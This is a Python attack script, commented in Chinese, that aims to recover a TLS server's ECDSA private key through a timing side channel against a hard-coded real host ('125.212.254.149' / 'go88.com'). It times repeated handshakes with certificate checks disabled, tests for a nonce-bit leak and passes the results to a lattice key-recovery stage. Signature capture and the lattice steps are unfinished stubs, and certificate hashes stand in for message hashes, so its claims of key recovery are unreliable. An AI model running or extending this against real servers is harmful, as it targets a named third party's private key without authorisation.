#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ECDSA私钥恢复完整攻击脚本
独立运行，不依赖其他模块
"""

import socket
import ssl
import time
import hashlib
import struct
import json
import sys
from typing import List, Dict, Tuple, Optional
import base64

# ===== 配置参数 =====
TARGET_HOST = "125.212.254.149"  # 或 "go88.com"
TARGET_PORT = 443
TIME_THRESHOLD = 302.38  # ms，快慢响应分界线
TOTAL_SAMPLES = 1000  # 收集样本数

# ECDSA曲线参数 (P-256)
P256_N = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551
P256_P = 0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF

class TLSSignatureExtractor:
    """TLS握手签名提取器"""
    
    @staticmethod
    def parse_der_signature(der_bytes: bytes) -> Optional[Tuple[int, int]]:
        """
        解析DER编码的ECDSA签名
        返回 (r, s) 值
        """
        try:
            # ECDSA-Sig-Value ::= SEQUENCE { r INTEGER, s INTEGER }
            if not der_bytes or der_bytes[0] != 0x30:  # SEQUENCE
                return None
            
            # 跳过SEQUENCE标签和长度
            idx = 2
            if der_bytes[1] & 0x80:  # 长形式长度
                len_bytes = der_bytes[1] & 0x7F
                idx = 2 + len_bytes
            
            # 解析 r
            if der_bytes[idx] != 0x02:  # INTEGER
                return None
            r_len = der_bytes[idx + 1]
            r_bytes = der_bytes[idx + 2:idx + 2 + r_len]
            r = int.from_bytes(r_bytes, 'big')
            
            # 解析 s
            idx = idx + 2 + r_len
            if der_bytes[idx] != 0x02:  # INTEGER
                return None
            s_len = der_bytes[idx + 1]
            s_bytes = der_bytes[idx + 2:idx + 2 + s_len]
            s = int.from_bytes(s_bytes, 'big')
            
            return (r, s)
        except Exception as e:
            print(f"[-] DER解析错误: {e}")
            return None
    
    @staticmethod
    def extract_from_tls_handshake(host: str, port: int) -> Dict:
        """
        执行TLS握手并提取签名
        返回: {time_ms, signature, cert_hash, error}
        """
        result = {
            'time_ms': 0,
            'signature': None,
            'cert_hash': None,
            'error': None
        }
        
        try:
            # 记录开始时间
            start_time = time.perf_counter()
            
            # 创建socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((host, port))
            
            # SSL包装
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # 尝试强制使用ECDSA
            try:
                # 优先ECDSA密码套件
                context.set_ciphers('ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305')
            except:
                pass
            
            ssock = context.wrap_socket(sock, server_hostname=host)
            
            # 记录响应时间
            elapsed = (time.perf_counter() - start_time) * 1000
            result['time_ms'] = elapsed
            
            # 获取证书
            cert_der = ssock.getpeercert(binary_form=True)
            result['cert_hash'] = hashlib.sha256(cert_der).hexdigest()[:16]
            
            # 获取协商的密码套件
            cipher = ssock.cipher()
            if cipher:
                result['cipher_suite'] = cipher[0]
            
            # TODO: 这里需要捕获ServerKeyExchange消息中的签名
            # 标准SSL库不直接暴露，需要更底层的方法
            
            # 临时方案：从证书本身提取签名（如果是自签名）
            # 真实攻击需要捕获握手过程中的签名
            
            ssock.close()
            sock.close()
            
        except Exception as e:
            result['error'] = str(e)
        
        return result

class ECDSANonceAnalyzer:
    """ECDSA nonce分析器"""
    
    def __init__(self):
        self.fast_signatures = []
        self.slow_signatures = []
        self.all_signatures = []
    
    def add_sample(self, time_ms: float, signature: Optional[Tuple[int, int]], cert_hash: str):
        """添加样本"""
        sample = {
            'time_ms': time_ms,
            'signature': signature,
            'cert_hash': cert_hash,
            'is_fast': time_ms < TIME_THRESHOLD
        }
        
        self.all_signatures.append(sample)
        
        if sample['is_fast']:
            self.fast_signatures.append(sample)
        else:
            self.slow_signatures.append(sample)
    
    def analyze_distribution(self) -> Dict:
        """分析时序分布"""
        if not self.all_signatures:
            return {}
        
        times = [s['time_ms'] for s in self.all_signatures]
        fast_count = len(self.fast_signatures)
        slow_count = len(self.slow_signatures)
        total = len(self.all_signatures)
        
        return {
            'total_samples': total,
            'fast_count': fast_count,
            'slow_count': slow_count,
            'fast_ratio': fast_count / total if total > 0 else 0,
            'avg_time': sum(times) / len(times),
            'min_time': min(times),
            'max_time': max(times),
            'threshold': TIME_THRESHOLD,
            'fast_avg': sum(s['time_ms'] for s in self.fast_signatures) / len(self.fast_signatures) if self.fast_signatures else 0,
            'slow_avg': sum(s['time_ms'] for s in self.slow_signatures) / len(self.slow_signatures) if self.slow_signatures else 0
        }
    
    def check_msb_hypothesis(self) -> Dict:
        """检查MSB假设"""
        analysis = self.analyze_distribution()
        
        # 检查是否接近50/50分布
        fast_ratio = analysis['fast_ratio']
        deviation = abs(fast_ratio - 0.5)
        
        return {
            'fast_ratio': fast_ratio,
            'deviation_from_50': deviation,
            'likely_msb_leak': deviation < 0.05,  # 偏差小于5%
            'confidence': 'HIGH' if deviation < 0.02 else 'MEDIUM' if deviation < 0.05 else 'LOW',
            'time_difference': analysis.get('slow_avg', 0) - analysis.get('fast_avg', 0)
        }

class LatticeAttack:
    """格攻击实现（简化版）"""
    
    @staticmethod
    def prepare_signatures_for_attack(fast_signatures: List[Dict]) -> List[Tuple[int, int, bytes]]:
        """
        准备用于格攻击的签名
        返回: [(r, s, h), ...]
        """
        prepared = []
        
        for sig in fast_signatures:
            if sig.get('signature'):
                r, s = sig['signature']
                # 这里需要实际的消息哈希
                # 临时使用证书哈希作为示例
                h = bytes.fromhex(sig['cert_hash'])
                prepared.append((r, s, h))
        
        return prepared
    
    @staticmethod
    def construct_lattice_matrix(signatures: List[Tuple[int, int, bytes]], msb_known: int = 1):
        """
        构造格矩阵
        利用MSB=0的约束
        """
        # 这里需要实现实际的格构造
        # 简化示例
        n = len(signatures)
        
        print(f"[*] 构造 {n}x{n} 格矩阵")
        print(f"[*] 利用MSB={msb_known}位已知的约束")
        
        # TODO: 实现格矩阵构造
        # 需要fpylll或SageMath
        
        return None
    
    @staticmethod
    def recover_private_key(signatures: List[Tuple[int, int, bytes]]) -> Optional[int]:
        """
        尝试恢复私钥
        """
        if len(signatures) < 100:
            print(f"[-] 签名数量不足: {len(signatures)}, 需要至少100个")
            return None
        
        print(f"[*] 使用 {len(signatures)} 个MSB=0的签名进行格攻击")
        
        # 构造格
        matrix = LatticeAttack.construct_lattice_matrix(signatures)
        
        if matrix is None:
            print("[-] 格构造失败")
            return None
        
        # TODO: LLL/BKZ约简
        # TODO: 提取私钥
        
        return None

def collect_samples(host: str, port: int, count: int) -> ECDSANonceAnalyzer:
    """收集样本主函数"""
    print(f"[*] 目标: {host}:{port}")
    print(f"[*] 计划收集: {count} 个样本")
    print(f"[*] 时序阈值: {TIME_THRESHOLD:.2f}ms")
    print("="*60)
    
    analyzer = ECDSANonceAnalyzer()
    extractor = TLSSignatureExtractor()
    
    for i in range(count):
        # 提取签名和时序
        result = extractor.extract_from_tls_handshake(host, port)
        
        if result['error']:
            print(f"[-] 样本 {i+1} 失败: {result['error']}")
            continue
        
        # 添加到分析器
        analyzer.add_sample(
            result['time_ms'],
            result.get('signature'),
            result.get('cert_hash', '')
        )
        
        # 进度报告
        if (i + 1) % 100 == 0:
            dist = analyzer.analyze_distribution()
            print(f"[+] 进度: {i+1}/{count}")
            print(f"    快速: {dist['fast_count']} ({dist['fast_ratio']*100:.1f}%)")
            print(f"    慢速: {dist['slow_count']} ({(1-dist['fast_ratio'])*100:.1f}%)")
            print(f"    平均时间: {dist['avg_time']:.2f}ms")
            
            if dist['fast_count'] > 0 and dist['slow_count'] > 0:
                time_diff = dist['slow_avg'] - dist['fast_avg']
                print(f"    时间差: {time_diff:.2f}ms")
        
        # 避免过快
        time.sleep(0.1)
    
    return analyzer

def main():
    """主攻击流程"""
    print("="*60)
    print("ECDSA私钥恢复攻击 - 基于时序侧信道")
    print("="*60)
    
    # 1. 收集样本
    print("\n[阶段1] 收集TLS握手样本")
    print("-"*40)
    
    analyzer = collect_samples(TARGET_HOST, TARGET_PORT, TOTAL_SAMPLES)
    
    # 2. 分析时序分布
    print("\n[阶段2] 时序分析")
    print("-"*40)
    
    distribution = analyzer.analyze_distribution()
    print(f"总样本: {distribution['total_samples']}")
    print(f"快速响应: {distribution['fast_count']} ({distribution['fast_ratio']*100:.1f}%)")
    print(f"慢速响应: {distribution['slow_count']} ({(1-distribution['fast_ratio'])*100:.1f}%)")
    print(f"平均时间: {distribution['avg_time']:.2f}ms")
    print(f"时间范围: {distribution['min_time']:.2f} - {distribution['max_time']:.2f}ms")
    
    if distribution['fast_count'] > 0 and distribution['slow_count'] > 0:
        time_diff = distribution['slow_avg'] - distribution['fast_avg']
        print(f"快慢组时间差: {time_diff:.2f}ms")
    
    # 3. MSB假设检验
    print("\n[阶段3] MSB偏差检验")
    print("-"*40)
    
    msb_check = analyzer.check_msb_hypothesis()
    print(f"快速响应比例: {msb_check['fast_ratio']*100:.2f}%")
    print(f"偏离50%: {msb_check['deviation_from_50']*100:.2f}%")
    print(f"MSB泄露可能: {msb_check['likely_msb_leak']}")
    print(f"置信度: {msb_check['confidence']}")
    print(f"时间差异: {msb_check['time_difference']:.2f}ms")
    
    # 4. 保存数据
    print("\n[阶段4] 保存分析结果")
    print("-"*40)
    
    output_data = {
        'target': f"{TARGET_HOST}:{TARGET_PORT}",
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
        'distribution': distribution,
        'msb_analysis': msb_check,
        'fast_signatures': analyzer.fast_signatures[:100],  # 保存前100个
        'attack_ready': len(analyzer.fast_signatures) >= 100 and msb_check['likely_msb_leak']
    }
    
    output_file = f"ecdsa_attack_data_{TARGET_HOST}_{int(time.time())}.json"
    with open(output_file, 'w') as f:
        json.dump(output_data, f, indent=2, default=str)
    
    print(f"✓ 数据已保存到: {output_file}")
    
    # 5. 尝试私钥恢复
    if output_data['attack_ready']:
        print("\n[阶段5] 私钥恢复攻击")
        print("-"*40)
        print(f"[!] 检测到MSB泄露！")
        print(f"[!] 有 {len(analyzer.fast_signatures)} 个可能的MSB=0签名")
        
        # 准备签名
        attack_sigs = LatticeAttack.prepare_signatures_for_attack(analyzer.fast_signatures)
        
        if attack_sigs:
            print(f"[*] 准备了 {len(attack_sigs)} 个签名用于格攻击")
            
            # 执行攻击
            private_key = LatticeAttack.recover_private_key(attack_sigs)
            
            if private_key:
                print(f"\n[!!!] 成功恢复私钥: {hex(private_key)}")
                print("[!!!] 攻击成功 - 城池已占领！")
            else:
                print("\n[-] 格攻击未成功")
                print("[*] 可能需要更多签名或改进攻击算法")
        else:
            print("[-] 未能提取足够的签名数据")
            print("[*] 需要改进签名提取方法")
    else:
        print("\n[-] 条件不满足，无法执行私钥恢复")
        if not msb_check['likely_msb_leak']:
            print("    原因: 未检测到明显的MSB偏差")
        if len(analyzer.fast_signatures) < 100:
            print(f"    原因: 快速签名不足 ({len(analyzer.fast_signatures)}/100)")
    
    print("\n" + "="*60)
    print("攻击结束")
    print("="*60)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] 用户中断")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] 错误: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)